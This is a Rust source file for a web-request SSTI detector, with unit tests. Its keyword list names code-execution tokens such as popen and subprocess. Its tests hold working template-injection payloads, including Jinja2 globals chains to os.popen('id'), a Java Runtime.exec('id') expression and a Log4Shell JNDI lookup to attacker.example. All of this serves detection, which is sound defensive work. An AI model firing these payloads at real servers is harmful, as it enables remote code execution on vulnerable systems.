//! SSTI structural detector (Phase 6).
//!
//! Server-side template injection is delimiter-driven: the payload must land
//! inside a template expression (`{{…}}`, `${…}`, `<%=…%>`, `{%…%}`,
//! `#{…}`, `*{…}`, `@{…}`). This detector extracts the expression body and
//! tiers by what is inside it:
//!
//! | Expression content | Tier |
//! | --- | --- |
//! | runtime/class access (`__class__`, `Runtime`, `system(` …) | Block |
//! | arithmetic probes (`7*7`, `{{7`) | Block |
//! | any other non-empty expression | Monitor |
//! | no delimiter | no finding |
//!
//! `${jndi:…}` (Log4Shell) intentionally monotors here — its own detector
//! and signatures own the block decision for that family.

use super::super::{
    Action, AttackCategory, Confidence, Detector, DetectorId, DetectorResult,
    EvidenceSource, Finding, Severity,
};

use crate::canonical::CanonicalRequest;

/// Default maximum value length considered by the structural analysis.
pub const DEFAULT_MAX_VALUE_LEN: usize = 8 * 1024;

/// Template delimiter pairs, longest-open first.
const DELIMITERS: &[(&str, &str)] = &[
    ("<%=", "%>"),
    ("{{", "}}"),
    ("{%", "%}"),
    ("#{", "}"),
    ("*{", "}"),
    ("@{", "}"),
    ("${", "}"),
];

/// Content that indicates runtime/class access from inside a template.
const CODE_TOKENS: &[&str] = &[
    "__class__",
    "__base__",
    "__globals__",
    "__import__",
    "__builtins__",
    "system(",
    "popen(",
    "subprocess",
    "processbuilder",
    "getruntime",
    "runtime.",
    "getclass(",
    "class.forname",
    "java.lang",
    "freemarker",
    "templateengine",
    "self.",
    "config.",
    "request.",
];

/// Arithmetic / delimiter probes used to confirm evaluation.
const PROBES: &[&str] = &["7*7", "7*'7'", "7*\"7\"", "6*6", "8*8", "1337*1"];

/// First delimiter pair present in `low`, with its inner expression.
fn expression_body(low: &str) -> Option<(&'static str, &str)> {
    for (open, close) in DELIMITERS {
        let Some(start) = low.find(open) else {
            continue;
        };
        let inner_start = start + open.len();
        let Some(relative_end) = low[inner_start..].find(close) else {
            continue;
        };
        let inner = &low[inner_start..inner_start + relative_end];
        if !inner.is_empty() && inner.len() <= 256 {
            return Some((open, inner));
        }
    }
    None
}

struct Evidence {
    rule: &'static str,
    severity: Severity,
    action: Action,
    score: u32,
    detail: String,
}

fn analyze(value: &str) -> Option<Evidence> {
    let low = value.to_ascii_lowercase();
    let (delimiter, inner) = expression_body(&low)?;

    if CODE_TOKENS.iter().any(|token| inner.contains(token)) {
        return Some(Evidence {
            rule: "sem.ssti.code_execution",
            severity: Severity::Critical,
            action: Action::Block,
            score: 40,
            detail: format!(
                "template expression {delimiter:?} accesses runtime/code"
            ),
        });
    }
    if PROBES.iter().any(|probe| inner.contains(probe)) {
        return Some(Evidence {
            rule: "sem.ssti.expression_probe",
            severity: Severity::High,
            action: Action::Block,
            score: 30,
            detail: format!("template expression {delimiter:?} contains an evaluation probe"),
        });
    }
    Some(Evidence {
        rule: "sem.ssti.expression",
        severity: Severity::Medium,
        action: Action::Monitor,
        score: 15,
        detail: format!("template expression {delimiter:?} present in a user-controlled value"),
    })
}

/// SSTI structural detector.
#[derive(Debug, Clone, Copy)]
pub struct SstiDetector {
    max_value_len: usize,
}

impl SstiDetector {
    pub const fn new() -> Self {
        Self {
            max_value_len: DEFAULT_MAX_VALUE_LEN,
        }
    }

    pub const fn with_max_value_len(max_value_len: usize) -> Self {
        Self { max_value_len }
    }
}

impl Default for SstiDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for SstiDetector {
    fn id(&self) -> DetectorId {
        DetectorId("semantic.ssti.structural")
    }

    fn inspect(
        &self,
        request: &CanonicalRequest,
        ctx: &mut super::super::DetectionContext,
    ) -> DetectorResult {
        let mut findings: Vec<Finding> = Vec::new();
        let mut degraded = None;

        let scan = |value: &str,
                    source: EvidenceSource,
                    field: Option<&str>,
                    findings: &mut Vec<Finding>,
                    degraded: &mut Option<&'static str>| {
            if value.len() > self.max_value_len {
                if degraded.is_none() {
                    *degraded = Some("value exceeds semantic budget");
                }
                return;
            }
            let Some(evidence) = analyze(value) else {
                return;
            };
            let mut finding = Finding::new(
                DetectorId("semantic.ssti.structural"),
                evidence.rule,
                AttackCategory::Ssti,
            )
            .confidence(match evidence.action {
                Action::Block => Confidence::High,
                Action::Monitor => Confidence::Medium,
                _ => Confidence::Low,
            })
            .severity(evidence.severity)
            .score(evidence.score)
            .action(evidence.action)
            .source(source)
            .detail(evidence.detail);
            if let Some(field) = field {
                finding = finding.field(field.to_string());
            }
            findings.push(finding);
        };

        for param in request.query() {
            scan(
                &param.value,
                EvidenceSource::Query,
                Some(&param.name),
                &mut findings,
                &mut degraded,
            );
        }
        for (name, value) in request.cookies() {
            scan(
                value,
                EvidenceSource::Cookie,
                Some(name),
                &mut findings,
                &mut degraded,
            );
        }
        if let Some(body) = request.body() {
            let limit = ctx.budget().max_body_bytes.min(body.len());
            match std::str::from_utf8(&body[..limit]) {
                Ok(text) => {
                    scan(
                        text,
                        EvidenceSource::Body,
                        None,
                        &mut findings,
                        &mut degraded,
                    );
                    if body.len() > limit && degraded.is_none() {
                        degraded = Some("body scan truncated at budget");
                    }
                },
                Err(_) => {
                    if degraded.is_none() {
                        degraded = Some("body is not valid utf-8");
                    }
                },
            }
        }

        DetectorResult { findings, degraded }
    }
}

#[cfg(test)]
mod tests {
    use super::SstiDetector;
    use crate::canonical::{Canonicalizer, RequestParts};
    use crate::pipeline::{Action, AttackCategory, DetectionContext, Detector};

    fn query(value: &str) -> crate::pipeline::DetectorResult {
        let encoded = value
            .replace('%', "%25")
            .replace('&', "%26")
            .replace('#', "%23");
        let target = format!("/?q={encoded}");
        let request = Canonicalizer::default().canonicalize(RequestParts::new(
            "GET",
            "example.com",
            target,
        ));
        let detector = SstiDetector::new();
        let mut ctx = DetectionContext::new();
        detector.inspect(&request, &mut ctx)
    }

    fn tier(value: &str) -> Option<(String, Action)> {
        let result = query(value);
        result
            .findings
            .first()
            .map(|f| (f.rule_id.to_string(), f.action_hint))
    }

    #[test]
    fn probes_block() {
        for payload in ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{{6*6}}"] {
            let (_, action) = tier(payload).expect(payload);
            assert_eq!(action, Action::Block, "{payload}");
        }
    }

    #[test]
    fn runtime_access_blocks() {
        for payload in [
            "{{''.__class__.__mro__}}",
            "{{config.__class__.__init__.__globals__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        ] {
            let (rule, action) = tier(payload).expect(payload);
            assert_eq!(rule, "sem.ssti.code_execution", "{payload}");
            assert_eq!(action, Action::Block, "{payload}");
        }
    }

    #[test]
    fn plain_expressions_monitor() {
        for payload in [
            "{{user.name}}",
            "#{session['user']}",
            "Hello {{ username }}",
        ] {
            let (rule, action) = tier(payload).expect(payload);
            assert_eq!(rule, "sem.ssti.expression", "{payload}");
            assert_eq!(action, Action::Monitor, "{payload}");
        }
    }

    #[test]
    fn jndi_monitors_but_does_not_own_the_family() {
        // Log4Shell is blocked by its own detector; SSTI only notes it.
        let (rule, action) =
            tier("${jndi:ldap://attacker.example/a}").expect("finding");
        assert_eq!(rule, "sem.ssti.expression");
        assert_eq!(action, Action::Monitor);
    }

    #[test]
    fn clean_values_produce_nothing() {
        for value in [
            "hello world",
            "{\"name\":\"Ada\"}",
            "price=19.99",
            "| a | b |",
        ] {
            assert!(tier(value).is_none(), "{value}");
        }
    }

    #[test]
    fn category_is_ssti() {
        let result = query("{{''.__class__}}");
        assert_eq!(result.findings[0].category, AttackCategory::Ssti);
    }

    #[test]
    fn oversized_values_degrade() {
        let detector = SstiDetector::with_max_value_len(16);
        let target = format!("/?q={}", "{{7*7}}".repeat(4));
        let request = Canonicalizer::default().canonicalize(RequestParts::new(
            "GET",
            "example.com",
            target,
        ));
        let mut ctx = DetectionContext::new();
        let result = detector.inspect(&request, &mut ctx);
        assert!(result.findings.is_empty());
        assert_eq!(result.degraded, Some("value exceeds semantic budget"));
    }
}
